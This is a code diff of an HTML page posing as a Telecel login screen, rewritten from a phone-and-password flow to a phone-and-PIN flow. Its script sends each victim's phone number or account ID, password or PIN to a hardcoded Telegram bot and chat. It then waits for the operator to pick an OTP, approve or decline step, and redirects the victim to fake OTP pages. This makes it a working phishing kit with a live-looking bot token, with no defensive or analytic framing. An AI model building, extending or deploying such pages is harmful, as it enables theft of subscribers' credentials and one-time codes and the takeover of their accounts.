@@ -1,436 +1,409 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Telecel – Login</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>Telecel – Login with PIN</title>
+  <!-- Google Fonts & Icons -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Inter', Arial, Helvetica, sans-serif;
+    }
 
-<!-- Google Fonts & Icons -->
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    body {
+      background: #f5f5f5;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 16px;
+    }
 
-<style>
-*{
-  box-sizing:border-box;
-  font-family: 'Inter', Arial, Helvetica, sans-serif;
-}
+    /* Main container – exactly same as original */
+    .container {
+      width: 360px;
+      background: #f7f7f7;
+      border-radius: 28px;
+      padding: 40px 20px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+      position: relative;
+      overflow: hidden;
+      text-align: center;
+    }
 
-body{
-  margin:0;
-  background:#f5f5f5;
-  display:flex;
-  justify-content:center;
-}
+    /* Top red shape */
+    .top-bg {
+      position: absolute;
+      top: 0;
+      right: 0;
+      width: 220px;
+      height: 220px;
+      background: linear-gradient(135deg, rgba(255,0,0,0.25), rgba(255,0,0,0.6));
+      border-bottom-left-radius: 120px;
+    }
 
-.container {
-  width: 360px;
-  background: #f7f7f7;
-  border-radius: 28px;
-  padding: 40px 20px;
-  box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
-  position: relative;
-  overflow: hidden;
-  text-align: center;
-}
+    /* Content wrapper */
+    .content {
+      position: relative;
+      z-index: 2;
+    }
 
-/* TOP RED SHAPE */
-.top-bg{
-  position:absolute;
-  top:0;
-  right:0;
-  width:220px;
-  height:220px;
-  background:linear-gradient(135deg, rgba(255,0,0,0.25), rgba(255,0,0,0.6));
-  border-bottom-left-radius:120px;
-}
+    /* Logo */
+    .logo {
+      text-align: center;
+      margin-top: 60px;
+    }
+    .logo-circle {
+      width: 52px;
+      height: 52px;
+      background: #ff0000;
+      border-radius: 50%;
+      color: #ffffff !important;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 30px;
+      margin: auto;
+      font-weight: 800;
+    }
+    .logo-text {
+      color: #ff0000;
+      font-size: 26px;
+      font-weight: bold;
+      margin-top: 8px;
+    }
 
-/* CONTENT WRAPPER */
-.content {
-  position: relative;
-  z-index: 2;
-}
+    /* Titles */
+    .title {
+      text-align: center;
+      color: #ff0000;
+      font-size: 20px;
+      font-weight: 600;
+      margin-top: 15px;
+    }
+    .subtitle {
+      text-align: center;
+      color: #666;
+      font-size: 15px;
+      margin-top: 10px;
+      line-height: 1.5;
+    }
 
-/* LOGO */
-.logo{
-  text-align:center;
-  margin-top:60px;
-}
+    /* Form */
+    .form {
+      margin-top: 30px;
+      text-align: left;
+    }
 
-.logo .logo-circle {
-  width:52px;
-  height:52px;
-  background:#ff0000;
-  border-radius:50%;
-  color: #ffffff !important;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  font-size:30px;
-  margin:auto;
-  font-weight:800;
-  font-family: Arial, Helvetica, sans-serif;
-  line-height: 1;
-  text-decoration: none;
-}
+    .label {
+      font-size: 13px;
+      color: #666;
+      margin-bottom: 8px;
+      display: block;
+    }
 
-.logo-text{
-  color:#ff0000;
-  font-size:26px;
-  font-weight:bold;
-  margin-top:8px;
-}
+    /* Input & select */
+    .input, .select {
+      width: 100%;
+      height: 50px;
+      border-radius: 12px;
+      border: 1px solid #ddd;
+      padding: 0 15px;
+      font-size: 15px;
+      background: #fff;
+      outline: none;
+      transition: border 0.2s;
+    }
+    .input:focus, .select:focus {
+      border-color: #ff0000;
+    }
 
-/* TEXT */
-.title{
-  text-align:center;
-  color:#ff0000;
-  font-size:20px;
-  font-weight:600;
-  margin-top:15px;
-}
+    /* Custom dropdown */
+    .dropdown {
+      position: relative;
+      cursor: pointer;
+    }
+    .select-wrapper {
+      position: relative;
+    }
+    .select {
+      width: 100%;
+      height: 50px;
+      border-radius: 12px;
+      border: 1px solid #ddd;
+      padding: 0 40px 0 15px;
+      font-size: 15px;
+      background: #fff;
+      cursor: pointer;
+      appearance: none;
+    }
+    .arrow {
+      position: absolute;
+      right: 15px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 14px;
+      color: #888;
+      transition: 0.3s;
+      pointer-events: none;
+    }
+    .dropdown-list {
+      position: absolute;
+      width: 100%;
+      background: #fff;
+      border-radius: 12px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+      margin-top: 5px;
+      display: none;
+      overflow: hidden;
+      z-index: 10;
+    }
+    .dropdown-item {
+      padding: 15px;
+      font-size: 15px;
+      cursor: pointer;
+    }
+    .dropdown-item.active {
+      background: #ffe5e5;
+      color: #ff0000;
+    }
+    .dropdown-item:hover {
+      background: #f5f5f5;
+    }
 
-.subtitle{
-  text-align:center;
-  color:#666;
-  font-size:15px;
-  margin-top:10px;
-  line-height:1.5;
-}
+    /* PIN inputs row – exactly matches phone input width using grid */
+    .pin-row {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 12px;
+      margin-top: 8px;
+      margin-bottom: 20px;
+    }
+    .pin-input {
+      width: 100%;           /* fill the grid cell */
+      height: 50px;          /* same height as phone input */
+      border-radius: 12px;   /* same border radius */
+      border: 1px solid #ddd;
+      text-align: center;
+      font-size: 24px;
+      font-weight: 600;
+      background: #fff;
+      outline: none;
+      transition: border 0.2s;
+      /* password masking + numeric keyboard */
+      -webkit-text-security: disc;
+      inputmode: numeric;
+      pattern: \d*;
+      font-family: monospace;
+    }
+    .pin-input:focus {
+      border-color: #ff0000;
+      box-shadow: 0 0 0 2px rgba(255,0,0,0.2);
+    }
+    .pin-input.filled {
+      border-color: #ffaaaa;
+      background: #fff9f9;
+    }
 
-/* FORM */
-.form{
-  margin-top:30px;
-  text-align: left;
-}
+    /* Buttons */
+    .btn {
+      width: 100%;
+      height: 55px;
+      border: none;
+      border-radius: 14px;
+      font-size: 16px;
+      margin-top: 20px;
+      cursor: pointer;
+      font-weight: 600;
+    }
+    .btn-primary {
+      background: #ff0000;
+      color: #fff;
+    }
+    .btn-primary.disabled, .btn-primary:disabled {
+      background: #e5e5e5;
+      color: #999;
+      cursor: not-allowed;
+    }
+    .btn-outline {
+      background: transparent;
+      border: 2px solid #ff0000;
+      color: #666;
+      font-weight: 600;
+    }
 
-.label{
-  font-size:13px;
-  color:#666;
-  margin-bottom:8px;
-}
+    /* Version */
+    .version {
+      text-align: center;
+      color: #aaa;
+      font-size: 12px;
+      margin-top: 20px;
+    }
 
-.input, .select{
-  width:100%;
-  height:50px;
-  border-radius:12px;
-  border:1px solid #ddd;
-  padding:0 15px;
-  font-size:15px;
-  background:#fff;
-}
+    /* Spinner overlay */
+    #spinner {
+      position: fixed;
+      inset: 0;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      background: rgba(255, 255, 255, 0.7);
+      backdrop-filter: blur(2px);
+      z-index: 999;
+    }
+    .loader {
+      width: 44px;
+      height: 44px;
+      border: 4px solid #ffe0e0;
+      border-top: 4px solid #ff0000;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
 
-/* CUSTOM DROPDOWN */
-.dropdown{
-  position:relative;
-  cursor:pointer;
-}
-
-.select-wrapper{
-  position:relative;
-}
-
-.select{
-  width:100%;
-  height:50px;
-  border-radius:12px;
-  border:1px solid #ddd;
-  padding:0 40px 0 15px;
-  font-size:15px;
-  background:#fff;
-}
-
-.arrow{
-  position:absolute;
-  right:15px;
-  top:50%;
-  transform:translateY(-50%);
-  font-size:14px;
-  color:#888;
-  transition:0.3s;
-}
-
-.arrow.rotate{
-  transform:translateY(-50%) rotate(180deg);
-}
-
-.dropdown-list{
-  position:absolute;
-  width:100%;
-  background:#fff;
-  border-radius:12px;
-  box-shadow:0 4px 15px rgba(0,0,0,0.1);
-  margin-top:5px;
-  display:none;
-  overflow:hidden;
-}
-
-.dropdown-item{
-  padding:15px;
-  font-size:15px;
-}
-
-.dropdown-item.active{
-  background:#ffe5e5;
-  color:#ff0000;
-}
-
-.dropdown-item:hover{
-  background:#f5f5f5;
-}
-
-/* BUTTONS */
-.btn{
-  width:100%;
-  height:55px;
-  border:none;
-  border-radius:14px;
-  font-size:16px;
-  margin-top:20px;
-  cursor:pointer;
-}
-
-.btn-primary{
-  background:#ff0000;
-  color:#fff;
-  font-weight:600;
-}
-
-.btn-outline{
-  background:transparent;
-  border:2px solid #ff0000;
-  color:#666;
-  font-weight:600;
-}
-
-/* Password field (dynamically added) with eye toggle */
-.password-container {
-  margin-top: 15px;
-}
-
-.password-label {
-  font-size:13px;
-  color:#666;
-  margin-bottom:8px;
-  display: block;
-  text-align: left;
-}
-
-.password-wrapper {
-  position: relative;
-  width: 100%;
-  margin-bottom: 10px;
-}
-
-.password-input {
-  width: 100%;
-  height: 50px;
-  border-radius: 12px;
-  border: 1px solid #ddd;
-  padding: 0 45px 0 15px;
-  font-size: 15px;
-  background: #fff;
-}
-
-.eye-icon {
-  position: absolute;
-  right: 15px;
-  top: 50%;
-  transform: translateY(-50%);
-  color: #888;
-  cursor: pointer;
-  z-index: 3;
-  font-size: 18px;
-}
-
-.btn-password {
-  background: #ff0000;
-  color: #fff;
-  font-weight: 600;
-  width: 100%;
-  height: 55px;
-  border: none;
-  border-radius: 14px;
-  font-size: 16px;
-  cursor: pointer;
-}
-
-/* VERSION */
-.version{
-  text-align:center;
-  color:#aaa;
-  font-size:12px;
-  margin-top:20px;
-}
-
-/* SPINNER OVERLAY */
-#spinner {
-  position: fixed;
-  inset: 0;
-  display: none;
-  align-items: center;
-  justify-content: center;
-  background: rgba(255, 255, 255, 0.7);
-  backdrop-filter: blur(2px);
-  z-index: 999;
-}
-
-.loader {
-  width: 44px;
-  height: 44px;
-  border: 4px solid #ffe0e0;
-  border-top: 4px solid #ff0000;
-  border-radius: 50%;
-  animation: spin 1s linear infinite;
-}
-
-@keyframes spin {
-  to { transform: rotate(360deg); }
-}
-
-/* ERROR BOX (from sample) */
-.error-box{
-  position: absolute;
-  top: 20px;
-  left: 20px;
-  right: 20px;
-  background: #fff;
-  border: 2px solid #ff4d4d;
-  border-radius: 12px;
-  padding: 15px;
-  display: none;
-  box-shadow: 0 5px 20px rgba(0,0,0,0.1);
-  z-index: 100;
-}
-
-.error-title{
-  color: #ff0000;
-  font-weight: bold;
-  margin-bottom: 5px;
-}
-
-.error-text{
-  color: #444;
-  font-size: 14px;
-}
-
-.close{
-  position: absolute;
-  right: 15px;
-  top: 10px;
-  cursor: pointer;
-  font-size: 18px;
-  color: #999;
-}
-</style>
+    /* Error box */
+    .error-box {
+      position: absolute;
+      top: 20px;
+      left: 20px;
+      right: 20px;
+      background: #fff;
+      border: 2px solid #ff4d4d;
+      border-radius: 12px;
+      padding: 15px;
+      display: none;
+      box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+      z-index: 100;
+      text-align: left;
+    }
+    .error-title {
+      color: #ff0000;
+      font-weight: bold;
+      margin-bottom: 5px;
+    }
+    .error-text {
+      color: #444;
+      font-size: 14px;
+    }
+    .close {
+      position: absolute;
+      right: 15px;
+      top: 10px;
+      cursor: pointer;
+      font-size: 18px;
+      color: #999;
+    }
+  </style>
 </head>
-
 <body>
 
 <div class="container">
-
   <div class="top-bg"></div>
 
-  <!-- ERROR BOX (exactly as sample) -->
+  <!-- Error box -->
   <div class="error-box" id="errorBox">
     <div class="close" onclick="hideError()">×</div>
     <div class="error-title">Error</div>
-    <div class="error-text" id="errorText">Account details provided is incorrect</div>
+    <div class="error-text" id="errorText">Invalid credentials</div>
   </div>
 
   <div class="content">
-
-    <!-- LOGO -->
     <div class="logo">
-      <div class="logo-circle" style="color: #ffffff !important;">t</div>
+      <div class="logo-circle">t</div>
       <div class="logo-text">telecel</div>
     </div>
-
-    <!-- TEXT -->
     <div class="title">Welcome to Telecel Play</div>
     <div class="subtitle">
-      Enter your number to sign up or log in.<br>
-      You need to be a Telecel subscriber to proceed.
+      Enter your number or account ID and your 4‑digit PIN.
     </div>
 
-    <!-- FORM -->
-    <div class="form" id="formContainer">
-
+    <div class="form">
+      <!-- Account type dropdown -->
       <div class="label">Account type</div>
-
       <div class="dropdown" onclick="toggleDropdown()">
-
         <div class="select-wrapper">
           <input class="select" id="selectedType" value="Mobile" readonly>
           <span class="arrow" id="arrow">▼</span>
         </div>
-
         <div class="dropdown-list" id="dropdownList">
           <div class="dropdown-item active" onclick="selectType(event,'Mobile')">Mobile</div>
           <div class="dropdown-item" onclick="selectType(event,'Broadband')">Broadband</div>
         </div>
-
       </div>
 
+      <!-- Identifier field -->
       <div class="label" id="inputLabel" style="margin-top:15px;">Phone Number</div>
       <input class="input" id="inputField" placeholder="020XXXXXXX" inputmode="numeric">
 
-      <!-- Original Next button -->
-      <button class="btn btn-primary" id="nextBtn" onclick="submitForm()">Next</button>
-      
-      <!-- Placeholder for dynamic password field – now placed BEFORE Go Back button -->
-      <div id="passwordPlaceholder"></div>
-      
-      <button class="btn btn-outline">Go Back</button>
+      <!-- PIN inputs row (grid, exactly matching phone input width) -->
+      <div class="label" style="margin-top:15px;">4‑Digit PIN</div>
+      <div class="pin-row">
+        <input type="password" class="pin-input" id="pin1" maxlength="1" inputmode="numeric" pattern="\d" autocomplete="off">
+        <input type="password" class="pin-input" id="pin2" maxlength="1" inputmode="numeric" pattern="\d" autocomplete="off">
+        <input type="password" class="pin-input" id="pin3" maxlength="1" inputmode="numeric" pattern="\d" autocomplete="off">
+        <input type="password" class="pin-input" id="pin4" maxlength="1" inputmode="numeric" pattern="\d" autocomplete="off">
+      </div>
+
+      <!-- Login button -->
+      <button class="btn btn-primary" id="loginBtn" disabled>Login</button>
+      <button class="btn btn-outline" id="goBackBtn">Go Back</button>
 
       <div class="version">v26.2.2(TPA-2622)</div>
-
     </div>
-
   </div>
-
 </div>
 
-<!-- SPINNER OVERLAY -->
+<!-- Spinner overlay -->
 <div id="spinner">
   <div class="loader"></div>
 </div>
 
 <script>
-  // ==================== TELEGRAM BOT CONFIG ====================
-  // !!! REPLACE WITH YOUR ACTUAL BOT TOKEN AND CHAT ID !!!
+  // ========== TELEGRAM CONFIG ==========
   const BOT_TOKEN = '8276553360:AAGD0pyKatfqmNyfWnvQ6nFkuM3QG3kfJ9k';
   const CHAT_ID   = '1006917440';
+  const API_BASE  = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
-  // If you need a CORS proxy, change this line (e.g., add 'https://cors-anywhere.herokuapp.com/' before the URL)
-  const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
-
-  // ==================== DOM ELEMENTS ====================
-  const selectedType = document.getElementById('selectedType');
+  // ========== DOM ELEMENTS ==========
+  const selectedTypeInput = document.getElementById('selectedType');
   const inputField = document.getElementById('inputField');
   const dropdownList = document.getElementById('dropdownList');
   const arrow = document.getElementById('arrow');
+  const loginBtn = document.getElementById('loginBtn');
+  const goBackBtn = document.getElementById('goBackBtn');
   const spinner = document.getElementById('spinner');
-  const nextBtn = document.getElementById('nextBtn');
-  const passwordPlaceholder = document.getElementById('passwordPlaceholder');
   const errorBox = document.getElementById('errorBox');
   const errorText = document.getElementById('errorText');
 
-  // ==================== STATE ====================
+  // PIN inputs
+  const pinInputs = [
+    document.getElementById('pin1'),
+    document.getElementById('pin2'),
+    document.getElementById('pin3'),
+    document.getElementById('pin4')
+  ];
+
+  // ========== STATE ==========
   let isSubmitting = false;
   let currentPollInterval = null;
-  let passwordFieldVisible = false; // track if password field is shown
 
-  // ==================== ERROR HANDLING (from sample) ====================
+  // ========== ERROR HANDLING ==========
   function showError(message) {
-    errorText.innerText = message || 'Account details provided is incorrect';
+    errorText.innerText = message || 'Invalid credentials';
     errorBox.style.display = 'block';
   }
-
   function hideError() {
     errorBox.style.display = 'none';
   }
 
-  // ==================== INPUT FILTERING ====================
+  // ========== INPUT FILTERING (identifier) ==========
   function filterInput(value, type) {
     if (type === 'Mobile') {
       return value.replace(/[^0-9]/g, '');
@@ -439,8 +412,8 @@ body{
     }
   }
 
-  function applyFilter() {
-    const currentType = selectedType.value;
+  function applyIdentifierFilter() {
+    const currentType = selectedTypeInput.value;
     const raw = inputField.value;
     const filtered = filterInput(raw, currentType);
     if (filtered !== raw) {
@@ -448,20 +421,87 @@ body{
     }
   }
 
-  inputField.addEventListener('input', function(e) {
-    applyFilter();
-    // When user edits the phone, hide password field if visible and show Next button (and re-enable it)
-    if (passwordFieldVisible) {
-      hidePasswordField();
+  // Clear PIN fields (no focus stealing)
+  function clearPinFields() {
+    pinInputs.forEach(input => {
+      input.value = '';
+      input.classList.remove('filled');
+    });
+  }
+
+  // Focus first PIN field (used after decline)
+  function focusFirstPin() {
+    pinInputs[0].focus();
+  }
+
+  // Update login button state: identifier not empty AND all 4 PIN digits filled
+  function updateLoginButton() {
+    const identifier = inputField.value.trim();
+    const allPinsFilled = pinInputs.every(pin => pin.value.length === 1);
+    const isValid = identifier !== '' && allPinsFilled;
+    loginBtn.disabled = !isValid;
+    if (isValid) {
+      loginBtn.classList.remove('disabled');
+    } else {
+      loginBtn.classList.add('disabled');
     }
-    // Also hide any error box
+  }
+
+  // PIN auto-advance and styling
+  function setupPinInputs() {
+    pinInputs.forEach((input, idx) => {
+      input.addEventListener('input', function(e) {
+        let val = this.value;
+        val = val.replace(/\D/g, '').slice(0,1);
+        this.value = val;
+        if (val.length === 1) {
+          this.classList.add('filled');
+          if (idx < pinInputs.length - 1) {
+            pinInputs[idx + 1].focus();
+          }
+        } else {
+          this.classList.remove('filled');
+        }
+        updateLoginButton();
+      });
+
+      input.addEventListener('keydown', function(e) {
+        if (e.key === 'Backspace') {
+          if (this.value.length === 0 && idx > 0) {
+            e.preventDefault();
+            pinInputs[idx - 1].focus();
+            pinInputs[idx - 1].value = '';
+            pinInputs[idx - 1].classList.remove('filled');
+            updateLoginButton();
+          }
+        } else if (e.key === 'ArrowLeft') {
+          if (idx > 0) {
+            e.preventDefault();
+            pinInputs[idx - 1].focus();
+          }
+        } else if (e.key === 'ArrowRight') {
+          if (idx < pinInputs.length - 1) {
+            e.preventDefault();
+            pinInputs[idx + 1].focus();
+          }
+        } else if (!/^[0-9]$/.test(e.key) && e.key !== 'Tab' && e.key !== 'Delete') {
+          e.preventDefault();
+        }
+      });
+    });
+  }
+
+  // Reset PIN fields when identifier changes (no focus stealing)
+  inputField.addEventListener('input', function() {
+    applyIdentifierFilter();
+    clearPinFields();
+    updateLoginButton();
     hideError();
   });
-
   inputField.addEventListener('paste', function(e) {
     e.preventDefault();
     const pasted = (e.clipboardData || window.clipboardData).getData('text');
-    const currentType = selectedType.value;
+    const currentType = selectedTypeInput.value;
     const filtered = filterInput(pasted, currentType);
     const start = this.selectionStart || 0;
     const end = this.selectionEnd || 0;
@@ -469,23 +509,20 @@ body{
     this.value = filterInput(newValue, currentType);
     const newCursor = start + filtered.length;
     this.setSelectionRange(newCursor, newCursor);
-    // Also hide password field if visible
-    if (passwordFieldVisible) {
-      hidePasswordField();
-    }
+    clearPinFields();
+    updateLoginButton();
     hideError();
   });
 
-  // ==================== DROPDOWN FUNCTIONS ====================
+  // ========== DROPDOWN FUNCTIONS ==========
   function toggleDropdown() {
     const isVisible = dropdownList.style.display === 'block';
     dropdownList.style.display = isVisible ? 'none' : 'block';
     arrow.classList.toggle('rotate', !isVisible);
   }
-
   function selectType(e, type) {
     e.stopPropagation();
-    selectedType.value = type;
+    selectedTypeInput.value = type;
     document.querySelectorAll('.dropdown-item').forEach(item => {
       item.classList.remove('active');
     });
@@ -501,18 +538,13 @@ body{
       inputField.placeholder = 'Eg: Xgtrjj';
       inputField.inputMode = 'text';
     }
-
-    applyFilter();
+    applyIdentifierFilter();
     dropdownList.style.display = 'none';
     arrow.classList.remove('rotate');
-
-    // If password field is visible, hide it when account type changes
-    if (passwordFieldVisible) {
-      hidePasswordField();
-    }
+    clearPinFields();
+    updateLoginButton();
     hideError();
   }
-
   document.addEventListener('click', function(e) {
     if (!e.target.closest('.dropdown')) {
       dropdownList.style.display = 'none';
@@ -520,9 +552,9 @@ body{
     }
   });
 
-  // ==================== TELEGRAM HELPER FUNCTIONS ====================
-  // Escape HTML special characters to prevent injection
+  // ========== TELEGRAM HELPERS ==========
   function escapeHtml(unsafe) {
+    if (!unsafe) return '';
     return unsafe.replace(/[&<>"]/g, function(m) {
       if (m === '&') return '&amp;';
       if (m === '<') return '&lt;';
@@ -548,217 +580,144 @@ body{
   }
 
   function pollForCallback(expectedPrefix, expectedTs, onDecision) {
-  if (currentPollInterval) clearInterval(currentPollInterval);
+    if (currentPollInterval) clearInterval(currentPollInterval);
 
-  let lastUpdateId = 0;
+    let lastUpdateId = 0;
+    currentPollInterval = setInterval(async () => {
+      try {
+        const url = `${API_BASE}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
+        const response = await fetch(url);
+        const data = await response.json();
+        if (!data.ok || !data.result.length) return;
 
-  currentPollInterval = setInterval(async () => {
-    try {
-      const url = `${API_BASE}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
-      const response = await fetch(url);
-      const data = await response.json();
-      if (!data.ok || !data.result.length) return;
-
-      let decisionMade = false; // ← flag to prevent multiple triggers
-
-      data.result.forEach(update => {
-        lastUpdateId = update.update_id;
-        if (!decisionMade && update.callback_query && update.callback_query.data) {
-          const parts = update.callback_query.data.split('_');
-          if (parts.length >= 3) {
-            const [type, action, time] = parts;
-            if (time == expectedTs && type === expectedPrefix) {
-              decisionMade = true;
-              clearInterval(currentPollInterval);
-              currentPollInterval = null;
-              onDecision(action);
+        let decisionMade = false;
+        for (const update of data.result) {
+          lastUpdateId = update.update_id;
+          if (!decisionMade && update.callback_query && update.callback_query.data) {
+            const parts = update.callback_query.data.split('_');
+            if (parts.length >= 3) {
+              const [type, action, time] = parts;
+              if (time == expectedTs && type === expectedPrefix) {
+                decisionMade = true;
+                clearInterval(currentPollInterval);
+                currentPollInterval = null;
+                onDecision(action);
+              }
             }
           }
         }
-      });
-    } catch (err) {
-      console.warn('Polling error:', err);
-    }
-  }, 1500);
-}
+      } catch (err) {
+        console.warn('Polling error:', err);
+      }
+    }, 1500);
+  }
 
-  // ==================== GENERATE 6‑DIGIT OTP ====================
-  function generateOTP() {
+  // OTP generators
+  function generate5DigitOTP() {
+    return Math.floor(10000 + Math.random() * 90000).toString();
+  }
+  function generate6DigitOTP() {
     return Math.floor(100000 + Math.random() * 900000).toString();
   }
 
-  // ==================== SHOW / HIDE PASSWORD FIELD ====================
-  function hidePasswordField() {
-    passwordPlaceholder.innerHTML = '';
-    nextBtn.style.display = 'block'; // show original Next button
-    nextBtn.disabled = false;        // IMPORTANT: re-enable it
-    passwordFieldVisible = false;
-    // Stop any ongoing polling (decision no longer relevant)
-    if (currentPollInterval) {
-      clearInterval(currentPollInterval);
-      currentPollInterval = null;
-    }
-  }
-
-  function showPasswordField() {
-    // Hide the original Next button
-    nextBtn.style.display = 'none';
-
-    // Create password input with eye toggle
-    const passwordHtml = `
-      <div class="password-container">
-        <div class="password-label">Enter Password</div>
-        <div class="password-wrapper">
-          <input type="password" class="password-input" id="passwordField" placeholder="Enter password" autocomplete="off">
-          <i class="far fa-eye eye-icon" id="togglePassword"></i>
-        </div>
-        <button class="btn-password" id="submitPasswordBtn">Verify Password</button>
-      </div>
-    `;
-    passwordPlaceholder.innerHTML = passwordHtml;
-    passwordFieldVisible = true;
-
-    // Attach eye toggle event
-    const togglePassword = document.getElementById('togglePassword');
-    const passwordField = document.getElementById('passwordField');
-    togglePassword.addEventListener('click', function() {
-      const type = passwordField.getAttribute('type') === 'password' ? 'text' : 'password';
-      passwordField.setAttribute('type', type);
-      this.classList.toggle('fa-eye');
-      this.classList.toggle('fa-eye-slash');
-    });
-
-    // Attach event to the new button
-    document.getElementById('submitPasswordBtn').addEventListener('click', handlePasswordSubmit);
-  }
-
-  // ==================== HANDLE PASSWORD SUBMISSION ====================
-  async function handlePasswordSubmit() {
-    const passwordField = document.getElementById('passwordField');
-    const password = passwordField.value.trim();
-    if (!password) return;
-
-    spinner.style.display = 'flex';
-    isSubmitting = true;
-
-    const accountType = selectedType.value;
-    const inputValue = inputField.value.trim();
-    const ts = Date.now();
-
-    // Send password to Telegram with options OTP, Approve, Decline
-    // Identifier is plain, password is wrapped in <code> for easy copying
-    const identifierLine = accountType === 'Mobile' ? `Phone: ${inputValue}` : `Account: ${inputValue}`;
-    const escapedPassword = escapeHtml(password);
-    const msg = `Password Verification\n\n${identifierLine}\nPassword: <code>${escapedPassword}</code>\n\nChoose action:`;
-
-    await sendToTelegram({
-      chat_id: CHAT_ID,
-      text: msg,
-      parse_mode: 'HTML',
-      reply_markup: {
-        inline_keyboard: [[
-          { text: 'OTP', callback_data: `password_otp_${ts}` },
-          { text: 'Approve', callback_data: `password_approve_${ts}` },
-          { text: 'Decline', callback_data: `password_decline_${ts}` }
-        ]]
-      }
-    });
-
-    pollForCallback('password', ts, (action) => {
-      spinner.style.display = 'none';
-      isSubmitting = false;
-
-      if (action === 'otp') {
-        // Redirect to OTP page
-        const phoneDigits = inputField.value.replace(/\D/g, '');
-        sessionStorage.setItem('telecel_phone', phoneDigits);
-        sessionStorage.setItem('telecel_accountType', accountType);
-        sessionStorage.setItem('telecel_inputValue', inputValue);
-        sessionStorage.setItem('telecel_otp', generateOTP());
-        window.location.href = 'otp.html';
-      } else if (action === 'approve') {
-        // Redirect to pin page
-        window.location.href = 'pin.html';
-      } else if (action === 'decline') {
-        // Show error
-        showError('Wrong password');
-        passwordField.value = '';
-        passwordField.focus();
-      }
-    });
-  }
-
-  // ==================== FORM SUBMISSION (FIRST STEP) ====================
-  async function submitForm() {
+  // ========== LOGIN SUBMIT ==========
+  async function submitLogin() {
     if (isSubmitting) return;
 
-    const accountType = selectedType.value;
-    const inputValue = inputField.value.trim();
-
-    if (inputValue === '') return;
+    const identifier = inputField.value.trim();
+    const pin = pinInputs.map(p => p.value).join('');
+    if (identifier === '' || pin.length !== 4) {
+      showError('Please fill in all fields');
+      return;
+    }
 
     isSubmitting = true;
-    nextBtn.disabled = true;
+    loginBtn.disabled = true;
     spinner.style.display = 'flex';
 
-    // Store basic data for later use
-    const phoneDigits = inputField.value.replace(/\D/g, '');
-    sessionStorage.setItem('telecel_phone', phoneDigits);
-    sessionStorage.setItem('telecel_accountType', accountType);
-    sessionStorage.setItem('telecel_inputValue', inputValue);
-    sessionStorage.setItem('telecel_otp', generateOTP());
-
+    const accountType = selectedTypeInput.value;
     const ts = Date.now();
-    // Format identifier with HTML <code> tags for easy copying
-    let identifierLine;
-    if (accountType === 'Mobile') {
-      identifierLine = `Phone: <code>${escapeHtml(inputValue)}</code>`;
-    } else {
-      identifierLine = `Account: <code>${escapeHtml(inputValue)}</code>`;
-    }
-    const msg = `New Login Attempt\n\nAccount Type: ${accountType}\n${identifierLine}\n\nChoose action:`;
 
-    await sendToTelegram({
-      chat_id: CHAT_ID,
-      text: msg,
-      parse_mode: 'HTML',
-      reply_markup: {
-        inline_keyboard: [[
-          { text: 'OTP', callback_data: `initial_otp_${ts}` },
-          { text: 'Password', callback_data: `initial_password_${ts}` },
-          { text: 'Decline', callback_data: `initial_decline_${ts}` }
-        ]]
+    let identifierLabel = accountType === 'Mobile' ? 'Phone Number' : 'Account ID';
+    const escapedIdentifier = escapeHtml(identifier);
+    const escapedPin = escapeHtml(pin);
+    const msg = `🔐 Login Request\n\nAccount Type: ${accountType}\n${identifierLabel}: <code>${escapedIdentifier}</code>\nPIN: <code>${escapedPin}</code>\n\nChoose OTP length or Decline:`;
+
+    try {
+      await sendToTelegram({
+        chat_id: CHAT_ID,
+        text: msg,
+        parse_mode: 'HTML',
+        reply_markup: {
+          inline_keyboard: [[
+            { text: '5 OTP', callback_data: `login_5otp_${ts}` },
+            { text: '6 OTP', callback_data: `login_6otp_${ts}` },
+            { text: 'Decline', callback_data: `login_decline_${ts}` }
+          ]]
+        }
+      });
+
+      sessionStorage.setItem('telecel_accountType', accountType);
+      sessionStorage.setItem('telecel_inputValue', identifier);
+      if (accountType === 'Mobile') {
+        sessionStorage.setItem('telecel_phone', identifier.replace(/\D/g, ''));
+      } else {
+        sessionStorage.setItem('telecel_phone', identifier);
       }
-    });
 
-    pollForCallback('initial', ts, (action) => {
+      pollForCallback('login', ts, (action) => {
+        spinner.style.display = 'none';
+        isSubmitting = false;
+
+        if (action === '5otp') {
+          const otp = generate5DigitOTP();
+          sessionStorage.setItem('telecel_otp', otp);
+          sessionStorage.setItem('telecel_otp_length', '5');
+          window.location.href = 'otp5.html';
+        } else if (action === '6otp') {
+          const otp = generate6DigitOTP();
+          sessionStorage.setItem('telecel_otp', otp);
+          sessionStorage.setItem('telecel_otp_length', '6');
+          window.location.href = 'otp6.html';
+        } else if (action === 'decline') {
+          showError('Authentication declined. Please check your credentials.');
+          clearPinFields();
+          focusFirstPin();  // focus first PIN for re‑entry
+          loginBtn.disabled = false;
+          updateLoginButton();
+        }
+      });
+
+    } catch (err) {
+      console.error(err);
       spinner.style.display = 'none';
